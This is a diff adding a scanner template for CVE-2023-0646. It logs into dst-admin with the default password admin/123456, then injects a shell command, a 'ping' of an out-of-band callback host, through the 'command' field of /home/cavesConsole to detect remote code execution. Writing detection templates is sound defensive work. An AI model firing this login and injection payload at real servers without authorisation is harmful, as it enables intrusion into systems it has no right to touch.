@@ -1,0 +1,62 @@
+id: cve-2023-0646
+info:
+  name: dst-admin cavesConsole RCE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    dst-admin version 1.5.0 contains a command injection vulnerability in the
+    file `home/cavesConsole` through the `command` parameter, enabling attackers
+    to execute arbitrary commands on the server.
+  classification:
+    cvss-score: 7.5
+    cve-id: CVE-2023-0646
+  tags: command-injection, rce
+  reference:
+    - https://github.com/Ha0Liu/cveAdd/blob/developer/dst-admin%201.5.0%E5%90%8E%E5%8F%B0cavesConsole%E6%8E%A5%E5%8F%A3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Dst-admin%201.5.0%20background%20cavesConsole%20interface%20remote%20command%20execution.md
+
+variables:
+  random_id: "{{rand_base(4)}}"
+  interact_url: "{{interactsh-url}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: login-step
+    method: POST
+    path:
+      - '{{BaseURL}}/login'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      username=admin&password=123456
+    matchers:
+      - type: word
+        words:
+          - "登陆成功"
+        part: body
+    extractors:
+      - type: regex
+        name: session_cookie
+        group: 1
+        regex:
+          - 'Set-Cookie: (.*?);'
+        internal: true
+
+  - id: command-injection-step
+    method: POST
+    path:
+      - '{{BaseURL}}/home/cavesConsole'
+    headers:
+      Content-Type: application/json
+      Cookie: '{{session_cookie}}'
+    body: |
+      {"command":"\\"&ping {{interact_url}};\\""}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
